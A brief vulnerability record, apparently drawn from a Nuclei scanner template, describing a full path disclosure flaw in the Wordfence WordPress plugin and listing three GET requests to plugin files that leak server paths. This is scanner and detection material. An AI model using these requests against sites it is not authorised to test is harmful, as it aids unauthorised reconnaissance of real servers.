# Vulnerability: Wordfence - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-wordfence-fpd.yaml`)

## Description
Wordfence WordPress plugin contains a full path disclosure vulnerability due to improper access restrictions in its source files, allowing unauthenticated attackers to retrieve full server paths and aiding exploitation.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wordfence/wordfence.php
GET {{BaseURL}}/wp-content/plugins/wordfence/lib/wfAPI.php
GET {{BaseURL}}/wp-content/plugins/wordfence/waf/bootstrap.php
```

